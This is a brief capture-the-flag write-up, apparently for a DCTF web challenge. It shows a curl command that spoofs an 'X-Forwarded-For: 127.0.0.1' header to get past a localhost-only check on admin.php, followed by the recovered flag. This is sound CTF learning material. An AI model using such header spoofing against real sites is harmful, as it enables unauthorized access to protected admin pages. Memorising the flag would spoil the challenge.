

tried to look for any inspect clues didnt find anything except admin.php which led me to another page interestingly enough and left without clues i tried a curl

so i hit this command to get the flag:
curl -H "X-Forwarded-For: 127.0.0.1" http://34.185.192.227:31101/admin.php

flag:
**DCTF{4f9cb657d0d5eefd9fbcdaaa885f121abedc12ff590ff8a4bd87b89c8c3efc68}**